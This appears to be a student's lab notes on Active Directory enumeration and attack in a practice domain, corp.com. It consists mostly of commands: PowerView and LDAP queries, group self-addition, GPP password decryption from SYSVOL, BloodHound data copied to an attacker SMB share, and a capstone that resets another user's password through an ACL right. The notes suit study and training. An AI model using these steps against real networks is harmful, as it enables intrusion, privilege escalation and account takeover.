```
xfreerdp /u:stephanie /d:corp.com /v:192.168.225.75 /p:LegmanTeamBenzoin\!\!
net user /domain
net user jeffadmin /domain
net group /domain
net group "Sales Department" /domain  # test
```

### powershell enumeration
run our script
```
function LDAPSearch {
    param (
        [string]$LDAPQuery
    )

    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName

    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")

    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)

    return $DirectorySearcher.FindAll()

}
```

```
powershell -ep bypass
Import-Module .\enum.ps1
.\enumeration.ps1
```

retrieve the DN
```
([adsi]'').distinguishedName

LDAPSearch -LDAPQuery "(samAccountType=805306368)"
LDAPSearch -LDAPQuery "(objectclass=group)"
$sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Service Personnel))"
$sales.properties.member
$group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Development Department*))"
$group.properties.member

$user = LDAPSearch -LDAPQuery "(&(objectCategory=user)(cn=michelle*))"
$user.Properties
```

### Enumerating with powerview
```
xfreerdp /u:stephanie /d:corp.com /v:192.168.225.75 /p:LegmanTeamBenzoin\!\!
cd C:\tools
powershell -ep bypass
Import-Module .\PowerView.ps1
Import-Module .\powerview.ps1
Get-NetDomain
```

enumerate users
```
Get-NetUser
Get-NetUser | select cn
Get-NetUser | select cn,pwdlastset,lastlogon,whencreated
```

enumerate groups
```
Get-NetGroup | select cn
Get-NetGroup "Domain Admins" | select member
```

Enumerating operating systems
```
xfreerdp /u:stephanie /d:corp.com /v:192.168.240.75 /p:LegmanTeamBenzoin\!\!
```
### powerview commands
```
cd C:\tools
powershell -ep bypass
Import-Module .\PowerView.ps1

Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname,operatingsystemversion
```

getting permissions and logged on users (powerview)
- does the current user have admin access? (not just on current box)
```
Find-LocalAdminAccess
```

what users are logged onto what computer? (NetWkstaUserEnum and NetSessionEnum APIs)
```
Get-NetSession -ComputerName files04
Get-NetSession -ComputerName files04 -Verbose
```

try another method
```
cd C:\tools\PSTools
.\PsLoggedon.exe \\client74
```

### enumerating through service principal names
- service Accounts may also be members of high-privileged group
- a unique service instance identifier known as Service Principal Name (SPN) associates a service to a specific service account in Active Directory.
```
cd C:\tools
setspn -L iis_service
```

another way is to enumerate with powerview
```
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```
- iis_service has a linked SPN
- these services likely have higher privs than regular users

### Enumerating Object Permissions
```
xfreerdp /u:stephanie /d:corp.com /v:192.168.240.75 /p:LegmanTeamBenzoin\!\!
```
- an object in AD may have a set of permissions applied to it with multiple Access Control Entries (ACE)
- GenericAll: Full permissions on object
- GenericWrite: Edit certain attributes on the object
- WriteOwner: Change ownership of the object
- WriteDACL: Edit ACE's applied to object
- AllExtendedRights: Change password, reset password, etc.
- ForceChangePassword: Password change for object
- Self (Self-Membership): Add ourselves to for example a group

### enumerate ACEs
```
cd C:\Tools
powershell -ep bypass
Import-Module .\PowerView.ps1
Get-ObjectAcl -Identity stephanie
```

we want the security identifiers (SIDs) from this output, and make them easier to read
```
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
```

The highest access permission we can have on an object is GenericAll
```
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```

convert SID into names
```
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
```

add ourselves to group
```
net group "Management Department" stephanie /add /domain
```

verify added
```
Get-NetGroup "Management Department" | select member
```

remove our user
```
net group "Management Department" stephanie /del /domain
```

### Enumerating domain shares
```
xfreerdp /u:stephanie /d:corp.com /v:192.168.240.75 /p:LegmanTeamBenzoin\!\!
```

need to use powerview for this
```
cd C:\Tools
powershell -ep bypass
Import-Module .\PowerView.ps1
```

Find the shares in the domain
```
Find-DomainShare
```

find shares available to us
```
Find-DomainShare -CheckShareAccess
```

lets look at SYSVOL, as it may include files and folders that reside on the domain controller itself
```
ls \\dc1.corp.com\sysvol\corp.com\
```

look at a specific folder
```
ls \\dc1.corp.com\sysvol\corp.com\Policies
```

look at specific file
- this is an older domain policy file
- This is a common artifact on domain shares as system administrators often forget them when implementing new policies.

this file also contains an encrypted password
```
cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
```

this password is stored with GPP (group policy preferences) and encrypted with AES-256
```
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE" # password is P@$$w0rd
```

```
ls \\dc1.corp.com\sysvol\corp.com\
ls \\dc1.corp.com\sysvol\corp.com\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
```
### automation with sharphound
```
xfreerdp /u:stephanie /d:corp.com /v:192.168.214.75 /p:LegmanTeamBenzoin\!\!
cd C:\Tools
powershell -ep bypass
Import-Module .\Sharphound.ps1
Get-Help Invoke-BloodHound
```


attempt to gather All data, which will perform all collection methods except for local group policies.
```
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
```

data is stored in a zip on the user's desktop
```
ls C:\Users\stephanie\Desktop\
```


analyze the data using bloodhound on kali
- neo4j is a graph db that helps represent the data
```
sudo apt-get install bloodhound
sudo neo4j start # access at http://localhost:7474, default creds: neo4j, neo4j (change pw to kalitest)
```

start bloodhound from terminal
```
bloodhound
```

copy file from windows
```
impacket-smbserver -smb2support -user stephanie -password LegmanTeamBenzoin\!\! smb smb 
```

from windows - cmd
```
net use \\192.168.45.181\smb
copy "corp audit_20231101083532_BloodHound.zip" \\192.168.45.181\smb
```

### capstone
```
xfreerdp /u:stephanie /d:corp.com /v:192.168.214.75 /p:LegmanTeamBenzoin\!\!
cd C:\Tools
powershell -ep bypass
Import-Module .\PowerView.ps1
```

find that stephanie has access over robert
```
Find-InterestingDomainAcl
```

change their password since we have GenericAll
```
$pass = ConvertTo-SecureString 'password123!' -AsPlainText -Force
set-domainuserpassword -identity robert -accountpassword $pass

xfreerdp /u:robert /d:corp.com /v:192.168.214.74 /p:password123!
```